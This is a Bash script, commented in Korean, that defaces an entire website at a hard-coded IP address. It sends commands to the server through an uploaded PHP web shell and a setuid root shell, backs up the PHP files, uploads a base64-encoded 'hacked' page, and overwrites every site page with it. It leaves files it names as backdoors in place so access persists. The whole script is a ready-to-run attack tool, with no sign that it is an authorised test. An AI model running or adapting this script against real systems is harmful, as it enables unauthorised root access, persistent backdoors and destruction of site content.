#!/bin/bash
#
# 전체 사이트 디페이스 - 직접 실행 버전
# 모든 PHP 파일을 해킹 페이지로 교체
#

set -e

TARGET="http://52.78.221.104"
WEBSHELL="${TARGET}/uploads/x.php"
ROOTBASH="/var/www/html/www/uploads/rootbash"

GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${GREEN}============================================================${NC}"
echo -e "${GREEN}  전체 사이트 디페이스${NC}"
echo -e "${GREEN}  Target: 52.78.221.104${NC}"
echo -e "${GREEN}============================================================${NC}"
echo ""

# PHP 파일 목록 (리버스 쉘에서 확인한 것)
PHP_FILES=(
    "add_comment.php"
    "config.php"
    "download.php"
    "file.php"
    "index.php"
    "like_post.php"
    "login.php"
    "logout.php"
    "new_post.php"
    "profile.php"
    "register.php"
    "setup.php"
    "upload.php"
)

# 백도어 파일 (제외)
BACKDOOR_FILES=(
    "health-check.php"
    "system-check.php"
    "test_db.php"
)

echo -e "${YELLOW}[1/4] 연결 테스트 중...${NC}"
WHOAMI=$(curl -s "${WEBSHELL}?x=${ROOTBASH}%20-p%20-c%20'whoami'")
if [[ "$WHOAMI" == *"root"* ]]; then
    echo -e "${GREEN}  ✓ Root 권한 확인: $WHOAMI${NC}"
else
    echo -e "${RED}  ✗ Root 권한 없음!${NC}"
    exit 1
fi
echo ""

echo -e "${YELLOW}[2/4] 원본 백업 중...${NC}"
BACKUP_DIR="/root/backup_$(date +%Y%m%d_%H%M%S)"
curl -s "${WEBSHELL}?x=${ROOTBASH}%20-p%20-c%20'mkdir%20-p%20${BACKUP_DIR}'" > /dev/null
echo -e "${GREEN}  ✓ 백업 디렉토리 생성: $BACKUP_DIR${NC}"

for php_file in "${PHP_FILES[@]}"; do
    curl -s "${WEBSHELL}?x=${ROOTBASH}%20-p%20-c%20'cp%20/var/www/html/www/${php_file}%20${BACKUP_DIR}/${php_file}%202>/dev/null%20||%20true'" > /dev/null
    echo -e "  - $php_file 백업 완료"
done
echo ""

echo -e "${YELLOW}[3/4] 해킹 페이지 업로드 중...${NC}"

# Base64로 hacked_page.html 인코딩
HACKED_HTML_B64=$(base64 -i ../defacement/hacked_page.html)

# 서버에 전송하고 디코딩
echo "$HACKED_HTML_B64" | while IFS= read -r line; do
    curl -s "${WEBSHELL}?x=${ROOTBASH}%20-p%20-c%20'echo%20${line}%20>>%20/tmp/hacked_b64.txt'" > /dev/null
done

curl -s "${WEBSHELL}?x=${ROOTBASH}%20-p%20-c%20'base64%20-d%20/tmp/hacked_b64.txt%20>%20/tmp/hacked_page.html'" > /dev/null
echo -e "${GREEN}  ✓ 해킹 페이지 업로드 완료${NC}"
echo ""

echo -e "${YELLOW}[4/4] 모든 PHP 파일 교체 중...${NC}"

SUCCESS=0
SKIP=0

for php_file in "${PHP_FILES[@]}"; do
    # 백도어 파일은 제외
    if [[ " ${BACKDOOR_FILES[@]} " =~ " ${php_file} " ]]; then
        echo -e "  [SKIP] $php_file (백도어 파일)"
        ((SKIP++))
        continue
    fi

    # 파일 교체
    RESULT=$(curl -s "${WEBSHELL}?x=${ROOTBASH}%20-p%20-c%20'cp%20/tmp/hacked_page.html%20/var/www/html/www/${php_file}'")

    if [[ -z "$RESULT" ]] || [[ "$RESULT" != *"error"* ]]; then
        echo -e "  ${GREEN}[✓]${NC} $php_file"
        ((SUCCESS++))
    else
        echo -e "  ${RED}[✗]${NC} $php_file - 실패"
    fi
done

echo ""
echo -e "${GREEN}============================================================${NC}"
echo -e "${GREEN}  디페이스 완료!${NC}"
echo -e "${GREEN}============================================================${NC}"
echo ""
echo -e "교체 완료: ${GREEN}$SUCCESS${NC}개"
echo -e "건너뜀: ${YELLOW}$SKIP${NC}개"
echo ""
echo -e "확인:"
echo -e "  ${TARGET}/"
echo -e "  ${TARGET}/login.php"
echo -e "  ${TARGET}/profile.php"
echo ""
echo -e "복구 방법:"
echo -e "  curl \"${WEBSHELL}?x=${ROOTBASH}%20-p%20-c%20'cp%20-r%20${BACKUP_DIR}/*.php%20/var/www/html/www/'\""
echo ""
echo -e "${GREEN}============================================================${NC}"

# 정리
curl -s "${WEBSHELL}?x=${ROOTBASH}%20-p%20-c%20'rm%20-f%20/tmp/hacked_b64.txt%20/tmp/hacked_page.html'" > /dev/null
